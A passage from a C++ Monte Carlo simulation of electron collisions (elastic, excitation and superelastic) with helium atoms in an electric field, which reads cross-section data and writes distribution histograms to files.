        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 100000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");
    file1 << std::fixed << std::setprecision(10);        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");
    std::ofstream file16(""output_files/energy_gain.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }



    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    std::cout << N_He << ""\n"";

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //


    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    // double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    // double steps = static_cast<int>(time/dt);

    // std::cout << steps << ""\n"";
    // std::cout << dt << ""\n"";

    // //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    // int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

    // std::cout << ""Ne_collided:"" << Ne_collided << ""\n"";

    int print_interval = 10;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    double a_z = ((-1.0)*q * E_reduced) / m_e;
    double mass_ratio = 2.0*(m_e/M_n);
    double charge_mass_ratio = 0.5*m_e/q;
    double sqrt_charge_mass = sqrt(2*q/m_e);
    double C1 = -1.0*q*E_reduced;
    double C2 = 0.5*C1*C1/m_e;

    double t_elapsed = 0.0;

    std::cout << C1 << ""    "" << C2 << ""\n"";


    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        // Get initial densities
        double n_ground = N_He / Volume;
        double n_excited1 = exc_1.size() / Volume;
        double n_excited2 = exc_2.size() / Volume;
 
        double energy = Emin + (i + 0.5) * bin_width;
 
        // Total collision frequency for this energy bin
        double sigma_total = 
            elastic_vec[i] * n_ground +
            inelastic1_vec[i] * n_ground +
            inelastic2_vec[i] * n_ground +
            superelastic1_vec[i] * n_excited1 +
            superelastic2_vec[i] * n_excited2;
            // superelastic1_vec[i] * n_ground +
            // superelastic2_vec[i] * n_ground;            
 
        double v = sqrt(2 * energy * q / m_e);
        double nu_temp = sigma_total * v;
        
        if (nu_temp > nu_max) nu_max = nu_temp;
    }
 
    std::cout << ""initial nu_max: "" <<nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////    

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995


    while (t_elapsed < total_time) {
        // Handle edge case for final step
        if (t_elapsed + dt > total_time) {
            dt = total_time - t_elapsed;
        }    

        double P_coll = 1.0 - std::exp(-nu_max * dt);
 
        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        double energy_exc = 0.0; // calculating excitation losses each timestep
        double energy_sup = 0.0; // calculating superelastic gains each timestep
        double energy_Efield = 0.0; // calculating field gains/losses each timestep


        // std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""\n"";

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter

        /// -- electrin field heating along E-Z axis begin--- /// -- first half!!!
        for (int i = 0; i < n_e; i++) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[i].vz*half_dt + C2*half_dt*half_dt )/q; // dividing by q to get eV             
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[i].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[i].vx;
            double vy = electrons[i].vy;
            double vz = electrons[i].vz;
            electrons[i].energy = (vx*vx + vy*vy + vz*vz)*charge_mass_ratio;

        // -------------------------------------------- filed heating ends ------------------------//   
            if (dis(gen) < P_coll) {

                Electron& e = electrons[i];
                if (e.collided_en) continue;  // Skip already collided electrons

                double dens_neutrals = (N_He/Volume);
                double dens_exc_1 = (exc_1.size()/Volume);
                double dens_exc_2 = (exc_2.size()/Volume);
                double speed = sqrt_charge_mass*sqrt(e.energy);

                int bin_energy = static_cast<int>(e.energy / bin_width);
                double nu_elastic = dens_neutrals * elastic_vec[bin_energy] * speed;
                double nu_inelastic1 = dens_neutrals * inelastic1_vec[bin_energy] * speed;
                double nu_superelastic1 = dens_exc_1 * superelastic1_vec[bin_energy] * speed;
                double nu_inelastic2 = dens_neutrals * inelastic2_vec[bin_energy] * speed;
                double nu_superelastic2 = dens_exc_2 * superelastic2_vec[bin_energy] * speed;

                double r = dis(gen);

                double P0 = nu_elastic/nu_max;
                double P1 = (nu_elastic + nu_inelastic1)/nu_max;
                double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
                double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
                double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

                if (r < P0) {
    
                    // elastic collision happens
    
                    // ----   Collision energy redistribution module
    
                    // electron particle X Y Z initial velocities and energy
                    double V0_x = e.vx;
                    double V0_y = e.vy;
                    double V0_z = e.vz;
                    double E_0 = e.energy;
                    
                    // neutral that collides with electron

                    // randomize particles each collision

                    NeutralParticle tmp_neutral;
                    tmp_neutral.initialize(gen, dis, maxwell_neutral);
                    double V_x_n = tmp_neutral.vx;
                    double V_y_n = tmp_neutral.vy;
                    double V_z_n = tmp_neutral.vz;
                    double E_n = tmp_neutral.energy;

    
                    double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                    // initial relative velocity
                    double V_rel_x = V0_x - V_x_n;
                    double V_rel_y = V0_y - V_y_n;
                    double V_rel_z = V0_z - V_z_n;

                    double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);
                    if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                        std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                    }
                    //initial relative velocity unit vectors components
                    double e1 = V_rel_x/V_rel;
                    double e2 = V_rel_y/V_rel;
                    double e3 = V_rel_z/V_rel;

                    double C = -V_rel/(1.0+(m_e/M_n));
                    // double beta = sqrt(1.0 - thresh0/e.energy);
                    double beta = sqrt(1.0 - thresh0/e.energy);
                    // generating random variables to calculate random direction of center-of-mass after the collision
    
                    double R1 = dis(gen);
                    double R2 = dis(gen);
    
                    //// calculating spherical angles for center-of-mass random direction
                    // double theta = acos(1.0- 2.0*R1);
                    // double phi = 2*M_PI*R2;
                    double cos_khi = 1.0 - 2.0*R1;
                    double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                    if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                        std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                    }                
    
                    double phi = 2.0*M_PI*R2;

                    //calculating velocity change of electron

                    double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                    double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                    double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );

                    //updating electron energy and velocities   
    
                    //updating electron energy and velocities
                    
                    e.vx += dv_x;
                    e.vy += dv_y;
                    e.vz += dv_z;

                    e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
    
                    collision_counter_en++;
                    el_coll_counter++;
    
                    e.collided_en = true;
                }      

                else if (r < P1) {

                    //inelastic 1(triplet) collision happens

                    // ----   Collision energy redistribution module
    
                    // electron particle X Y Z initial velocities and energy
                    double V0_x = e.vx;
                    double V0_y = e.vy;
                    double V0_z = e.vz;
                    double E_0 = e.energy;
                    
                    // neutral that collides with electron

                    // randomize particles each collision

                    NeutralParticle tmp_neutral;
                    tmp_neutral.initialize(gen, dis, maxwell_neutral);
                    double V_x_n = tmp_neutral.vx;
                    double V_y_n = tmp_neutral.vy;
                    double V_z_n = tmp_neutral.vz;
                    double E_n = tmp_neutral.energy;

    
                    double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                    // initial relative velocity
                    double V_rel_x = V0_x - V_x_n;
                    double V_rel_y = V0_y - V_y_n;
                    double V_rel_z = V0_z - V_z_n;

                    double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);
                    
                    if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                        std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                    }

                    //initial relative velocity unit vectors components
                    double e1 = V_rel_x/V_rel;
                    double e2 = V_rel_y/V_rel;
                    double e3 = V_rel_z/V_rel;

                    double C = -V_rel/(1.0+(m_e/M_n));
                    double beta = sqrt(abs(1.0 - thresh1/e.energy));
                    // generating random variables to calculate random direction of center-of-mass after the collision
    
                    double R1 = dis(gen);
                    double R2 = dis(gen);
    
                    //// calculating spherical angles for center-of-mass random direction
                    // double theta = acos(1.0- 2.0*R1);
                    // double phi = 2*M_PI*R2;
                    double cos_khi = 1.0 - 2.0*R1;
                    double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                    if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                        std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                    }      
                    double phi = 2.0*M_PI*R2;

                    //calculating velocity change of electron

                    double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                    double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                    double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );

                    //updating electron energy and velocities         
                    
                    if (e.energy < thresh1) {
                        null_coll_counter++;
                        collision_counter_en++;
                        e.collided_en = true;
                        continue;
                    }
                    else {
                        e.vx += dv_x;
                        e.vy += dv_y;
                        e.vz += dv_z;

                        e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
    
                        collision_counter_en++;   
                        exc1_coll_counter++;
                        exc1_coll_counter_temp++;
    
                        e.collided_en = true;

                        // // pushing this neutral to an array of excited species exc_1
                        // if (N_He > 0) {
                        //     exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        //     N_He--;
                        // }
                    }
                }     

                else if (r < P2) {

                    //superelastic 1(triplet -> ground state) collision happens

                    if (exc_1.empty()) {
                        null_coll_counter++;
                        collision_counter_en++;
                        e.collided_en = true;
                        continue;            
                    }

                    // ----   Collision energy redistribution module
    
                    // electron particle X Y Z initial velocities and energy
                    double V0_x = e.vx;
                    double V0_y = e.vy;
                    double V0_z = e.vz;
                    double E_0 = e.energy;

                    // neutral that collides with electron
                    // taking particles from dynamic array of excited neutrals

                    int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                    Excited_neutral& exc = exc_1[index];
                    double V_x_n = exc.vx;
                    double V_y_n = exc.vy;
                    double V_z_n = exc.vz;
                    double E_n = exc.energy;
                    
                    double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                    // initial relative velocity
                    double V_rel_x = V0_x - V_x_n;
                    double V_rel_y = V0_y - V_y_n;
                    double V_rel_z = V0_z - V_z_n;

                    double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                    if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                        std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                    }

                    //initial relative velocity unit vectors components
                    double e1 = V_rel_x/V_rel;
                    double e2 = V_rel_y/V_rel;
                    double e3 = V_rel_z/V_rel;

                    double C = -V_rel/(1.0+(m_e/M_n));
                    double beta = sqrt(1.0 + thresh1/e.energy);
                    // generating random variables to calculate random direction of center-of-mass after the collision
    
                    double R1 = dis(gen);
                    double R2 = dis(gen);
    
                    //// calculating spherical angles for center-of-mass random direction
                    // double theta = acos(1.0- 2.0*R1);
                    // double phi = 2*M_PI*R2;
                    double cos_khi = 1.0 - 2.0*R1;
                    double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                    if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                        std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                    }      
                    double phi = 2.0*M_PI*R2;

                    //calculating velocity change of electron

                    double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                    double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                    double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );
    
                    //updating electron energy and velocities         
                    
                    e.vx += dv_x;
                    e.vy += dv_y;
                    e.vz += dv_z;

                    e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;

                    //counting collisions, working with flags, popping atom out of the vector
                    // if (!exc_1.empty()) {
                    //     std::swap(exc_1[index], exc_1.back());
                    //     exc_1.pop_back();
                    //     N_He++;
                    // }
                    collision_counter_en++;   
                    super1_coll_counter++;
                    super1_coll_counter_temp++;
                    energy_sup += thresh1;

                    e.collided_en = true;
                }  

                else if (r < P3) {

                    //inelastic 1(singlet) excitation collision happens

                    // ----   Collision energy redistribution module
    
                    // electron particle X Y Z initial velocities and energy
                    double V0_x = e.vx;
                    double V0_y = e.vy;
                    double V0_z = e.vz;
                    double E_0 = e.energy;
                    
                    // neutral that collides with electron

                    // randomize particles each collision

                    NeutralParticle tmp_neutral;
                    tmp_neutral.initialize(gen, dis, maxwell_neutral);
                    double V_x_n = tmp_neutral.vx;
                    double V_y_n = tmp_neutral.vy;
                    double V_z_n = tmp_neutral.vz;
                    double E_n = tmp_neutral.energy;

    
                    double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                    // initial relative velocity
                    double V_rel_x = V0_x - V_x_n;
                    double V_rel_y = V0_y - V_y_n;
                    double V_rel_z = V0_z - V_z_n;

                    double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                    if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                        std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                    }

                    //initial relative velocity unit vectors components
                    double e1 = V_rel_x/V_rel;
                    double e2 = V_rel_y/V_rel;
                    double e3 = V_rel_z/V_rel;

                    double C = -V_rel/(1.0+(m_e/M_n));
                    double beta = sqrt(abs(1.0 - thresh2/e.energy));
                    // generating random variables to calculate random direction of center-of-mass after the collision
    
                    double R1 = dis(gen);
                    double R2 = dis(gen);
    
                    //// calculating spherical angles for center-of-mass random direction
                    // double theta = acos(1.0- 2.0*R1);
                    // double phi = 2*M_PI*R2;
                    double cos_khi = 1.0 - 2.0*R1;
                    double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                    if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                        std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                    }      
                    double phi = 2.0*M_PI*R2;

                    //calculating velocity change of electron

                    double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                    double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                    double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );

                    //updating electron energy and velocities         
                    
                    if (e.energy < thresh1) {
                        null_coll_counter++;
                        collision_counter_en++;
                        e.collided_en = true;
                        continue;
                    }
                    else {
                        e.vx += dv_x;
                        e.vy += dv_y;
                        e.vz += dv_z;

                        e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
    
                        collision_counter_en++;   
                        exc2_coll_counter++;
                        exc2_coll_counter_temp++;
    
                        e.collided_en = true;

                        // pushing this neutral to an array of excited species exc_2

                        // if (N_He > 0) {
                        //     exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        //     N_He--;
                        // }
                    }
                }

                else if (r < P4) {

                    //supernelastic 1(singlet -> ground state) collision happens

                    if (exc_2.empty()) {
                        null_coll_counter++;
                        collision_counter_en++;
                        e.collided_en = true;
                        continue;            
                    }

                    // ----   Collision energy redistribution module
    
                    // electron particle X Y Z initial velocities and energy
                    double V0_x = e.vx;
                    double V0_y = e.vy;
                    double V0_z = e.vz;
                    double E_0 = e.energy;

                    // neutral that collides with electron
                    // taking particles from dynamic array of excited neutrals

                    int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                    Excited_neutral& exc = exc_2[index];
                    double V_x_n = exc.vx;
                    double V_y_n = exc.vy;
                    double V_z_n = exc.vz;
                    double E_n = exc.energy;
                    
                    double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                    // initial relative velocity
                    double V_rel_x = V0_x - V_x_n;
                    double V_rel_y = V0_y - V_y_n;
                    double V_rel_z = V0_z - V_z_n;

                    double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                    if (std::isnan(V_rel) || std::isinf(V_rel) || fabs(V_rel) < 1e-12) {
                        std::cerr << ""Invalid V_rel copmuted: "" << V_rel << "" at timestep "" << t_elapsed << std::endl;
                    }

                    //initial relative velocity unit vectors components
                    double e1 = V_rel_x/V_rel;
                    double e2 = V_rel_y/V_rel;
                    double e3 = V_rel_z/V_rel;

                    double C = -V_rel/(1.0+(m_e/M_n));
                    double beta = sqrt(1.0 + thresh2/e.energy);
                    // generating random variables to calculate random direction of center-of-mass after the collision
    
                    double R1 = dis(gen);
                    double R2 = dis(gen);
    
                    //// calculating spherical angles for center-of-mass random direction
                    // double theta = acos(1.0- 2.0*R1);
                    // double phi = 2*M_PI*R2;
                    double cos_khi = 1.0 - 2.0*R1;
                    double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
                    if (std::isnan(sin_khi) || std::isinf(sin_khi)) {
                        std::cerr << ""Invalid sin_khi copmuted: "" << sin_khi << "" at timestep "" << t_elapsed << std::endl;
                    }      
                    double phi = 2.0*M_PI*R2;

                    //calculating velocity change of electron

